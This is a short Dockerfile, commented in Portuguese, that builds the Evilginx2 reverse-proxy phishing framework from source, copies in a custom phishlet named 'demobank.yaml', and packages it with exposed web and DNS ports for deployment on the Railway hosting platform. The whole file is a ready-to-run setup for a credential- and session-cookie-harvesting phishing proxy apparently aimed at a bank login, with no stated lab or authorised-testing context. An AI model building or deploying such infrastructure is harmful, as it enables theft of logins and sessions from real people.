# Usando a imagem base oficial do Go para compilar
FROM golang:1.21-alpine AS builder

RUN apk add --no-cache git make build-base

# Clone e build do Evilginx2 (ou 3 dependendo da versão)
RUN git clone https://github.com/kgretzky/evilginx2.git /app
WORKDIR /app
RUN make

# Imagem final mais leve
FROM alpine:latest
RUN apk add --no-cache ca-certificates

WORKDIR /app
COPY --from=builder /app/bin/evilginx .
RUN mkdir ./phishlets

# Copia o seu phishlet personalizado para dentro da imagem
COPY ./phishlets/demobank.yaml ./phishlets/demobank.yaml

# Script de inicialização automática (O pulo do gato)
RUN echo '#!/bin/sh' > /app/run.sh && \
    echo './evilginx -p ./phishlets/ -c /app/data -g /app/config.yaml' >> /app/run.sh

RUN chmod +x /app/run.sh

# Expor portas necessárias
EXPOSE 80 443 53/udp

# Comando que o Railway vai executar
ENTRYPOINT ["./evilginx", "-p", "./phishlets"]
